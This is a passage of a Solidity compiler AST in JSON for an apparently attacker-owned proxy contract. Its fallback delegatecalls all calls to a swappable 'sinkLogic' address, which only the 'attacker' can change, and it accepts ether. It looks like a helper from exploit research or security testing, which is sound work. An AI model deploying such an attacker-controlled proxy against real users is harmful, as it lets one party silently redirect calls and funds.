													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 10,
												"mutability": "mutable",
												"name": "_attacker",
												"nameLocation": "273:9:0",
												"nodeType": "VariableDeclaration",
												"scope": 22,
												"src": "265:17:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 9,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "265:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "248:35:0"
									},
									"returnParameters": {
										"id": 12,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "284:0:0"
									},
									"scope": 50,
									"src": "237:112:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 26,
										"nodeType": "Block",
										"src": "383:413:0",
										"statements": [
											{
												"AST": {
													"nativeSrc": "402:388:0",
													"nodeType": "YulBlock",
													"src": "402:388:0",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "429:1:0",
																		"nodeType": "YulLiteral",
																		"src": "429:1:0",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "432:1:0",
																		"nodeType": "YulLiteral",
																		"src": "432:1:0",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"arguments": [],
																		"functionName": {
																			"name": "calldatasize",
																			"nativeSrc": "435:12:0",
																			"nodeType": "YulIdentifier",
																			"src": "435:12:0"
																		},
																		"nativeSrc": "435:14:0",
																		"nodeType": "YulFunctionCall",
																		"src": "435:14:0"
																	}
																],
																"functionName": {
																	"name": "calldatacopy",
																	"nativeSrc": "416:12:0",
																	"nodeType": "YulIdentifier",
																	"src": "416:12:0"
																},
																"nativeSrc": "416:34:0",
																"nodeType": "YulFunctionCall",
																"src": "416:34:0"
															},
															"nativeSrc": "416:34:0",
															"nodeType": "YulExpressionStatement",
															"src": "416:34:0"
														},
														{
															"nativeSrc": "463:81:0",
															"nodeType": "YulVariableDeclaration",
															"src": "463:81:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [],
																		"functionName": {
																			"name": "gas",
																			"nativeSrc": "490:3:0",
																			"nodeType": "YulIdentifier",
																			"src": "490:3:0"
																		},
																		"nativeSrc": "490:5:0",
																		"nodeType": "YulFunctionCall",
																		"src": "490:5:0"
																	},
																	{
																		"arguments": [
																			{
																				"name": "sinkLogic.slot",
																				"nativeSrc": "503:14:0",
																				"nodeType": "YulIdentifier",
																				"src": "503:14:0"
																			}
																		],
																		"functionName": {
																			"name": "sload",
																			"nativeSrc": "497:5:0",
																			"nodeType": "YulIdentifier",
																			"src": "497:5:0"
																		},
																		"nativeSrc": "497:21:0",
																		"nodeType": "YulFunctionCall",
																		"src": "497:21:0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "520:1:0",
																		"nodeType": "YulLiteral",
																		"src": "520:1:0",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"arguments": [],
																		"functionName": {
																			"name": "calldatasize",
																			"nativeSrc": "523:12:0",
																			"nodeType": "YulIdentifier",
																			"src": "523:12:0"
																		},
																		"nativeSrc": "523:14:0",
																		"nodeType": "YulFunctionCall",
																		"src": "523:14:0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "539:1:0",
																		"nodeType": "YulLiteral",
																		"src": "539:1:0",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "542:1:0",
																		"nodeType": "YulLiteral",
																		"src": "542:1:0",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "delegatecall",
																	"nativeSrc": "477:12:0",
																	"nodeType": "YulIdentifier",
																	"src": "477:12:0"
																},
																"nativeSrc": "477:67:0",
																"nodeType": "YulFunctionCall",
																"src": "477:67:0"
															},
															"variables": [
																{
																	"name": "result",
																	"nativeSrc": "467:6:0",
																	"nodeType": "YulTypedName",
																	"src": "467:6:0",
																	"type": ""
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "572:1:0",
																		"nodeType": "YulLiteral",
																		"src": "572:1:0",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "575:1:0",
																		"nodeType": "YulLiteral",
																		"src": "575:1:0",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"arguments": [],
																		"functionName": {
																			"name": "returndatasize",
																			"nativeSrc": "578:14:0",
																			"nodeType": "YulIdentifier",
																			"src": "578:14:0"
																		},
																		"nativeSrc": "578:16:0",
																		"nodeType": "YulFunctionCall",
																		"src": "578:16:0"
																	}
																],
																"functionName": {
																	"name": "returndatacopy",
																	"nativeSrc": "557:14:0",
																	"nodeType": "YulIdentifier",
																	"src": "557:14:0"
																},
																"nativeSrc": "557:38:0",
																"nodeType": "YulFunctionCall",
																"src": "557:38:0"
															},
															"nativeSrc": "557:38:0",
															"nodeType": "YulExpressionStatement",
															"src": "557:38:0"
														},
														{
															"cases": [
																{
																	"body": {
																		"nativeSrc": "641:59:0",
																		"nodeType": "YulBlock",
																		"src": "641:59:0",
																		"statements": [
																			{
																				"expression": {
																					"arguments": [
																						{
																							"kind": "number",
																							"nativeSrc": "666:1:0",
																							"nodeType": "YulLiteral",
																							"src": "666:1:0",
																							"type": "",
																							"value": "0"
																						},
																						{
																							"arguments": [],
																							"functionName": {
																								"name": "returndatasize",
																								"nativeSrc": "669:14:0",
																								"nodeType": "YulIdentifier",
																								"src": "669:14:0"
																							},
																							"nativeSrc": "669:16:0",
																							"nodeType": "YulFunctionCall",
																							"src": "669:16:0"
																						}
																					],
																					"functionName": {
																						"name": "revert",
																						"nativeSrc": "659:6:0",
																						"nodeType": "YulIdentifier",
																						"src": "659:6:0"
																					},
																					"nativeSrc": "659:27:0",
																					"nodeType": "YulFunctionCall",
																					"src": "659:27:0"
																				},
																				"nativeSrc": "659:27:0",
																				"nodeType": "YulExpressionStatement",
																				"src": "659:27:0"
																			}
																		]
																	},
																	"nativeSrc": "634:66:0",
																	"nodeType": "YulCase",
																	"src": "634:66:0",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "639:1:0",
																		"nodeType": "YulLiteral",
																		"src": "639:1:0",
																		"type": "",
																		"value": "0"
																	}
																},
																{
																	"body": {
																		"nativeSrc": "721:59:0",
																		"nodeType": "YulBlock",
																		"src": "721:59:0",
																		"statements": [
																			{
																				"expression": {
																					"arguments": [
																						{
																							"kind": "number",
																							"nativeSrc": "746:1:0",
																							"nodeType": "YulLiteral",
																							"src": "746:1:0",
																							"type": "",
																							"value": "0"
																						},
																						{
																							"arguments": [],
																							"functionName": {
																								"name": "returndatasize",
																								"nativeSrc": "749:14:0",
																								"nodeType": "YulIdentifier",
																								"src": "749:14:0"
																							},
																							"nativeSrc": "749:16:0",
																							"nodeType": "YulFunctionCall",
																							"src": "749:16:0"
																						}
																					],
																					"functionName": {
																						"name": "return",
																						"nativeSrc": "739:6:0",
																						"nodeType": "YulIdentifier",
																						"src": "739:6:0"
																					},
																					"nativeSrc": "739:27:0",
																					"nodeType": "YulFunctionCall",
																					"src": "739:27:0"
																				},
																				"nativeSrc": "739:27:0",
																				"nodeType": "YulExpressionStatement",
																				"src": "739:27:0"
																			}
																		]
																	},
																	"nativeSrc": "713:67:0",
																	"nodeType": "YulCase",
																	"src": "713:67:0",
																	"value": "default"
																}
															],
															"expression": {
																"name": "result",
																"nativeSrc": "615:6:0",
																"nodeType": "YulIdentifier",
																"src": "615:6:0"
															},
															"nativeSrc": "608:172:0",
															"nodeType": "YulSwitch",
															"src": "608:172:0"
														}
													]
												},
												"evmVersion": "cancun",
												"externalReferences": [
													{
														"declaration": 4,
														"isOffset": false,
														"isSlot": true,
														"src": "503:14:0",
														"suffix": "slot",
														"valueSize": 1
													}
												],
												"id": 25,
												"nodeType": "InlineAssembly",
												"src": "393:397:0"
											}
										]
									},
									"id": 27,
									"implemented": true,
									"kind": "fallback",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 23,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "363:2:0"
									},
									"returnParameters": {
										"id": 24,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "383:0:0"
									},
									"scope": 50,
									"src": "355:441:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 44,
										"nodeType": "Block",
										"src": "850:131:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 36,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"expression": {
																	"id": 33,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967281,
																	"src": "868:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 34,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "872:6:0",
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"src": "868:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"id": 35,
																"name": "attacker",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 6,
																"src": "882:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "868:22:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "4f6e6c792061747461636b6572",
															"id": 37,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "892:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43",
																"typeString": "literal_string \"Only attacker\""
															},
															"value": "Only attacker"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43",
																"typeString": "literal_string \"Only attacker\""
															}
														],
														"id": 32,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "860:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 38,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "860:48:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 39,
												"nodeType": "ExpressionStatement",
												"src": "860:48:0"
											},
											{
												"expression": {
													"id": 42,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 40,
														"name": "sinkLogic",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4,
														"src": "918:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 41,
														"name": "newLogic",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 29,
														"src": "930:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "918:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 43,
												"nodeType": "ExpressionStatement",
												"src": "918:20:0"
											}
										]
									},
									"functionSelector": "795e617e",
									"id": 45,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "updateLogic",
									"nameLocation": "811:11:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 29,
												"mutability": "mutable",
												"name": "newLogic",
												"nameLocation": "831:8:0",
												"nodeType": "VariableDeclaration",
												"scope": 45,
												"src": "823:16:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 28,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "823:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "822:18:0"
									},
									"returnParameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "850:0:0"
									},
									"scope": 50,
									"src": "802:179:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 48,
										"nodeType": "Block",
										"src": "1014:2:0",
										"statements": []
									},
									"id": 49,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 46,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "994:2:0"
									},
									"returnParameters": {
										"id": 47,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1014:0:0"
									},
									"scope": 50,
									"src": "987:29:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 51,
							"src": "141:877:0",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "32:987:0"
				},
				"id": 0
			}
		}
	}
}